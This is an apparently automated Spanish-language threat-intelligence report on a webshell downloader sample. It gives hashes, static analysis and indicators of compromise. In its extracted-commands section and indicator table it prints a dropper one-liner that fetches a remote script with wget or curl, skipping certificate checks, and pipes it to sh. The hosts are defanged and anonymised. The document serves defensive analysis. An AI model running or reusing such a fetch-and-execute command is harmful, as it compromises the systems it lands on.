# 🧬 Payload Analysis

`87db1dcc17892092d8bed919dd10e1c8ce8d246002881a18bf0a5abc259d7883`

## 📌 Resumen

Artefacto asociado a la familia **webshell** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota, Ejecución. Se identificó 1 comando observado o extraído. Se identificaron 6 indicadores técnicos. **Ficha malware:** [malware-like/oraculo/downloader/87db1dcc17892092d8bed919dd10e1c8ce8d246002881a18bf0a5abc259d7883.md](../../../../../malware-like/oraculo/downloader/87db1dcc17892092d8bed919dd10e1c8ce8d246002881a18bf0a5abc259d7883.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Familia:** `webshell`
- **Confianza de familia:** `Media`
- **Riesgo:** `Critical`

## 🗓️ Registro

- **Registrado:** `2026-08-09T20:44:37.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `87db1dcc17892092d8bed919dd10e1c8ce8d246002881a18bf0a5abc259d7883`
- **SHA1:** `59a1464803b84854da9bd8384a67fda800e71c1a`
- **MD5:** `e35e8d8b93b9266ff079df18bce51b39`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with very long lines (320), with CRLF line terminators |
| Tamaño | 4.0 KiB |
| Entropía | 5.61 |
| Strings | 101 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with very long lines (320), with CRLF line terminators; strings=101; iocs=6

## 🖥️ Comandos observados / extraídos

```text
(wget --no-check-certificate -qO- hxxps://14.46.136.XXX/sh || curl -sk hxxps://14.46.136.XXX/sh) | sh -s apache.selfrepPOS
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxps://14.46.136.XXX/sh | strings |
| url | hxxps://14.46.136.XXX/sh) | strings |
| ip | 190.179.166.XXX | static_analysis |
| ip | 14.46.136.XXX | static_analysis |
| command | (wget --no-check-certificate -qO- hxxps://14.46.136.XXX/sh \|\| curl -sk hxxps://14.46.136.XXX/sh) \| sh -s apache.selfrepPOS | strings |
| hash | 87db1dcc17892092d8bed919dd10e1c8ce8d246002881a18bf0a5abc259d7883 | static_analysis |
| ip | 211.62.61.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
